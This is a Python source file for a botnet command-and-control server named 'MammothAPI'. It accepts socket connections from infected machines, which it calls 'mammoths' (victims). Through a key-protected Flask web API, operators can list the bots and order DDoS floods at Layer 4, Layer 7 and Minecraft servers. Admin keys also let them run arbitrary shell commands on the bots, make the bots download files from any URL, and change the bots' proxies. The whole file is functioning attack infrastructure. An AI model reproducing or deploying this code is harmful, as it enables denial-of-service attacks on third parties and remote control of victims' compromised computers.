import json
import socket
import jpysocket
import threading
import datetime
from flask import Flask, jsonify, request

keys = json.load(open("keys.json", "r"))
clients = []

server_socket = socket.socket()
server_socket.bind(('127.0.0.1', 7777))
server_socket.listen(50)

app = Flask(__name__)


def log(text):
    current_time = datetime.datetime.now()
    formatted_time = current_time.strftime("[%d.%m.%Y %H:%M:%S] ")
    ftext = formatted_time + text + '\n'
    print(ftext)
    with open("logs.txt", "a") as logs_file:
        logs_file.write(ftext)
        logs_file.close()


def send_cmd(cmd):
    for client in clients:
        message = jpysocket.jpyencode(cmd)
        client.send(message)

    return {"clients": len(clients)}


def handle_client(client_socket):
    client_address = client_socket.getpeername()
    ip = f"{client_address[0]}:{client_address[1]}"
    log(f"[INFO/CONNECT] * Мамонт ({ip}) подключился!")
    clients.append(client_socket)

    while True:
        try:
            data = client_socket.recv(1024)
            if not data:
                break
        except ConnectionResetError:
            break

    log(f"[INFO/DISCONNECT] * Мамонт ({ip}) отключился!")
    clients.remove(client_socket)
    client_socket.close()


def accept_connects():
    while True:
        client_socket, address = server_socket.accept()
        threading.Thread(target=handle_client, args=(client_socket,)).start()


@app.before_request
def before_request_func():
    action = request.url.replace(request.url_root, '')
    key = request.args.get('key')

    if key is None:
        return jsonify({"result": "KEY_NOT_SPECIFIED"})
    elif key not in keys:
        return jsonify({"result": "KEY_NOT_FOUND"})
    else:
        log(f"[INFO/API-ACTION] * {key} совершил действие - {action}")


@app.route('/')
def help_page():
    key = request.args.get('key')
    return f'''
    <center>
    <h1>MammothAPI</h1>
    <h5>Current version: 1.0 BETA</h5>
    <h3>Developed by TurboKoT</h3>
    <hr>
    <h2>Key information:</h2>
    Rank: {keys[key]["rank"]}
    <hr>
    <h2>API docs:</h2>
    <h3>User commands:</h3>
    /online - List of infected machines<br><br>
    /attack?type=[Type (L4, L7, MINECRAFT)]& [Arguments..] &duration=[duration] - Start attack<br>
    L4 Args - ip, port, method<br>
    L7 Args - url, method<br>
    MINECRAFT Args - ip, port, method, protocol, nthreads, lthreads<br>
    <h3>Admin commands:</h3>
    /proxy - Change proxies on infected machines<br>
    /shell?command=[COMMAND]<br>
    /download?url=[LINK]<br>
    </center>
    ''' + '''
    <style>
      h1, h5 {
        margin: 0; /* Убирает внешние отступы */
        padding: 0; /* Убирает внутренние отступы */
      }
    </style>
    '''


@app.route('/proxy')
def update_proxies():
    key = request.args.get('key')
    if keys[key]['rank'] != "admin":
        return jsonify({"result": "KEY_NOT_ADMINISTERED"})
    else:
        progress = send_cmd("update-proxies")["clients"]
        return jsonify({"result": "SUCCESS", "clients": progress})


@app.route('/online')
def online():
    online_clients = {}
    for client in clients:
        client_address = client.getpeername()
        ip = f"{client_address[0]}:{client_address[1]}"
        online_clients[ip] = {"ping": -1}

    return jsonify({"result": "SUCCESS", "clients": online_clients, "clients_count": len(clients)})


@app.route('/attack')
def attack():
    atype = request.args.get('type')
    time = request.args.get('time')

    attack_args = {
        'L4': ['ip', 'port', 'method'],
        'L7': ['url', 'method'],
        'MINECRAFT': ['ip', 'port', 'method', 'protocol', 'nthreads', 'lthreads']
    }

    args = {}

    if atype is None:
        return jsonify({"result": "ATTACK_TYPE_NOT_SPECIFIED"})
    elif atype not in attack_args:
        return jsonify({"result": f"INVALID_ATTACK_TYPE_{atype.upper()}"})
    elif time is None:
        return jsonify({"result": "ATTACK_TIME_NOT_SPECIFIED"})
    elif not time.isdigit():
        return jsonify({"result": "ATTACK_TIME_MUST_BE_NUMBER"})

    for arg in attack_args[atype]:
        arg_value = request.args.get(arg)
        if arg_value is None:
            return jsonify({"result": f"ATTACK_{arg.upper()}_NOT_SPECIFIED"})
        else:
            args[arg] = arg_value

    progress = send_cmd(f"attack {atype} {' '.join(args.values())} {time}")["clients"]
    return jsonify({"result": "SUCCESS", "clients": progress})


@app.route('/shell')
def shell():
    key = request.args.get('key')
    command = request.args.get('command')
    print(command)
    if keys[key]['rank'] != "admin":
        return jsonify({"result": "KEY_NOT_ADMINISTERED"})
    elif command is None:
        return jsonify({"result": "SHELL_COMMAND_NOT_SPECIFIED"})
    else:
        progress = send_cmd(f"shell {command}")["clients"]
        return jsonify({"result": "SUCCESS", "clients": progress})


@app.route('/download')
def download():
    key = request.args.get('key')
    url = request.args.get('url')
    filename = request.args.get('filename')
    print(url)
    if keys[key]['rank'] != "admin":
        return jsonify({"result": "KEY_NOT_ADMINISTERED"})
    elif url is None:
        return jsonify({"result": "DOWNLOAD_URL_NOT_SPECIFIED"})
    else:
        progress = send_cmd(f"download {filename} {url}")["clients"]
        return jsonify({"result": "SUCCESS", "clients": progress})


if __name__ == '__main__':
    threading.Thread(target=accept_connects).start()
    app.run(host='0.0.0.0', port=80, debug=True, use_reloader=False)
